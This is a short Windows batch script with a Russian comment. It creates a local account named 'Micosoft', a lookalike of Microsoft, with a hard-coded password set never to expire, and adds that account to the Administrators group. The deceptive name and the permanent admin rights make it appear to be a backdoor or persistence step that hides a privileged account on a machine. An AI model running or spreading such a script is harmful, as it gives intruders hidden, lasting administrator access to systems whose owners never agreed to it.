chcp 1251
@echo off
set NEW_USER=Micosoft
set NEW_PASS=Samsung1!


net user %NEW_USER% %NEW_PASS% /add
wmic path Win32_UserAccount where Name="%NEW_USER%" set PasswordExpires=false
net user %NEW_USER% /logonpasswordchg:no
REM Добавление пользователя в группу "Администраторы"
net localgroup Администраторы %NEW_USER% /add


pause